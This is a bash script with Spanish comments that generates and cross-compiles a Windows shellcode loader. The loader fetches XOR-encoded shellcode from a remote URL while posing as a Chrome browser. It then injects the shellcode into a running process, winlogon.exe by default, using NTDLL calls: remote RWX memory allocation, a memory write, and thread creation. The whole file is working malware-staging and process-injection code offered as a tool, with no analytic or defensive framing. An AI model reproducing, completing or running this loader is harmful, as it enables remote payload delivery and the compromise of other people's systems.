#!/bin/bash
TARGET=""
URL=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT=15
MAX_SIZE=2097152
XOR_KEY=0x42
PROCESS_NAME="winlogon.exe"
FILE_C="loader_windows_infect.c"
usage() {
    echo "Usage: $0 --target <linux|windows> --url <url>"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)
            TARGET="$2"
            shift 2
            ;;
        --url)
            URL="$2"
            shift 2
            ;;
        --key)
            XOR_KEY="$2"
            shift 2
            ;;
        *)
            echo "Opción desconocida: $1"
            exit 1
            ;;
    esac
done

[[ -z "$TARGET" || -z "$URL" ]] && usage
[[ "$TARGET" != "linux" && "$TARGET" != "windows" ]] && { echo "Target must be 'linux' or 'windows'"; exit 1; }

ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')

cat > "$FILE_C" << 'EOF'
// inject_remote_download.c
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")

// --- Placeholders para tu script bash ---
#define XOR_KEY __XOR_KEY__
const char* SHELLCODE_URL = "$ESCAPED_URL";
const char* PROCESS_NAME = "$PROCESS_NAME";  // Ej: "notepad.exe"
const char* USER_AGENT     = "$ESCAPED_UA";
const long TIMEOUT         = $TIMEOUT;
const size_t MAX_RESPONSE  = $MAX_SIZE;
// ----------------------------------------

// === Definiciones manuales para MinGW ===
#ifndef _NTDEF_H
#define _NTDEF_H

typedef long NTSTATUS;
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000L
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
    do { \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = r; \
        (p)->ObjectName = n; \
        (p)->Attributes = a; \
        (p)->SecurityDescriptor = s; \
        (p)->SecurityQualityOfService = NULL; \
    } while(0)

#endif

// === Prototipos NTDLL ===
typedef NTSTATUS (NTAPI *NtOpenProcess_)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCOBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList);

typedef NTSTATUS (NTAPI *NtClose_)(
    HANDLE Handle);

static NtOpenProcess_      NtOpenProcessF = NULL;
static NtAllocateVirtualMemory_ NtAllocateVirtualMemoryF = NULL;
static NtWriteVirtualMemory_    NtWriteVirtualMemoryF = NULL;
static NtCreateThreadEx_        NtCreateThreadExF = NULL;
static NtClose_                 NtCloseF = NULL;

#define populatePrototype(x, dll) \
    do { Nt##x##F = (Nt##x##_) GetProcAddress(dll, "Nt" #x); } while(0)

// === Buffer dinámico ===
typedef struct {
    char* buffer;
    size_t size;
    size_t capacity;
} Buffer;

int init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2,2), &wsa) == 0;
}

int buffer_append(Buffer* b, const char* data, size_t len) {
    if (b->size + len > b->capacity) {
        size_t new_cap = b->capacity ? b->capacity * 2 : 4096;
        while (new_cap < b->size + len) new_cap *= 2;
        char* new_buf = realloc(b->buffer, new_cap);
        if (!new_buf) return 0;
        b->buffer = new_buf;
        b->capacity = new_cap;
    }
    memcpy(b->buffer + b->size, data, len);
    b->size += len;
    return 1;
}

// === Extraer y desofuscar shellcode (\x.. format + XOR) ===
int extract_shellcode(const char* input, size_t len, unsigned char** out) {
    *out = NULL;
    unsigned char* sc = malloc(1024);
    size_t capacity = 1024;
    size_t count = 0;

    for (size_t i = 0; i < len - 3; i++) {
        if (input[i] == '\\' && input[i+1] == 'x' && i+3 < len) {
            char hex[3] = { input[i+2], input[i+3], '\0' };
            char* end;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2 && val >= 0 && val <= 255) {
                if (count >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(sc, capacity);
                    if (!tmp) { free(sc); return -1; }
                    sc = tmp;
                }
                sc[count++] = (unsigned char)(val ^ XOR_KEY);
                i += 3;
            }
        }
    }

    if (count == 0) { free(sc); return 0; }
    *out = sc;
    return count;
}

// === Obtener PID por nombre del proceso ===
DWORD get_pid_by_name(const char* proc_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, proc_name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(&pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// === Función principal ===
int main() {
    if (!init_winsock()) {
        return 1;
    }

    // === 1. Descargar shellcode ===
    const char* proto = strstr(SHELLCODE_URL, "://");
    if (!proto) return 1;
    proto += 3;

    const char* path = strchr(proto, '/');
    if (!path) path = "/";
    size_t path_len = strlen(path);

    char host[256] = {0};
    int port = 80;
    size_t host_len = path - proto;
    if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
    strncpy(host, proto, host_len);

    char* colon = strchr(host, ':');
    if (colon) {
        port = atoi(colon + 1);
        *colon = '\0';
    }

    struct hostent* he = gethostbyname(host);
    if (!he) return 1;
    struct in_addr* addr = (struct in_addr*)he->h_addr_list[0];

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return 1;

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr = *addr;

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    char request[1024];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, port, USER_AGENT);

    send(sock, request, strlen(request), 0);

    Buffer response = {0};
    char buffer[4096];
    int bytes;

    while ((bytes = recv(sock, buffer, sizeof(buffer)-1, 0)) > 0) {
        buffer[bytes] = '\0';
        if (!buffer_append(&response, buffer, bytes)) break;
    }
    closesocket(sock);
    WSACleanup();

    char* body = strstr(response.buffer, "\r\n\r\n");
    if (!body) {
        free(response.buffer);
        return 1;
    }
    body += 4;

    unsigned char* shellcode;
    int sc_len = extract_shellcode(body, response.buffer + response.size - body, &shellcode);
    free(response.buffer);

    if (sc_len <= 0) {
        return 1;
    }

    // === 2. Buscar PID por nombre ===
    DWORD pid = get_pid_by_name(PROCESS_NAME);
    if (pid == 0) {
        fprintf(stderr, "No se encontró el proceso: %s\n", PROCESS_NAME);
        free(shellcode);
        return 1;
    }

    // === 3. Cargar funciones de ntdll ===
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        free(shellcode);
        return 1;
    }

    populatePrototype(OpenProcess, ntdll);
    populatePrototype(AllocateVirtualMemory, ntdll);
    populatePrototype(WriteVirtualMemory, ntdll);
    populatePrototype(CreateThreadEx, ntdll);
    populatePrototype(Close, ntdll);

    if (!NtOpenProcessF || !NtAllocateVirtualMemoryF || !NtWriteVirtualMemoryF ||
        !NtCreateThreadExF || !NtCloseF) {
        free(shellcode);
        return 1;
    }

    // === 4. Inyectar en el proceso ===
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, NULL, 0, NULL, NULL);

    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };

    NTSTATUS status = NtOpenProcessF(&hProcess,
                                     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
                                     &objAttrs, &clientId);

    if (status != STATUS_SUCCESS) {
        free(shellcode);
        return 1;
    }

    SIZE_T size = sc_len;
    PVOID remoteMem = NULL;

    status = NtAllocateVirtualMemoryF(hProcess, &remoteMem, 0, &size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        free(shellcode);
        return 1;
    }

    status = NtWriteVirtualMemoryF(hProcess, remoteMem, shellcode, sc_len, NULL);
    free(shellcode);  // Liberar después de copiar
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        return 1;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadExF(&hThread, THREAD_ALL_ACCESS, &objAttrs, hProcess,
                               remoteMem, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        NtCloseF(hProcess);
        return 1;
    }

    // === 5. Limpiar ===
    NtCloseF(hThread);
    NtCloseF(hProcess);

    printf("Inyección exitosa en PID: %lu\n", pid);
    return 0;
}

EOF

sed -i "s|__XOR_KEY__|$XOR_KEY|g" "$FILE_C"
sed -i "s|\$ESCAPED_URL|$ESCAPED_URL|g" "$FILE_C"
sed -i "s|\$PROCESS_NAME|$PROCESS_NAME|g" "$FILE_C"
sed -i "s|\$ESCAPED_UA|$ESCAPED_UA|g" "$FILE_C"
sed -i "s|\$TIMEOUT|$TIMEOUT|g" "$FILE_C"
sed -i "s|\$MAX_SIZE|$MAX_SIZE|g" "$FILE_C"

x86_64-w64-mingw32-gcc loader_windows_infect.c -o inject.exe -lntdll -s -O2
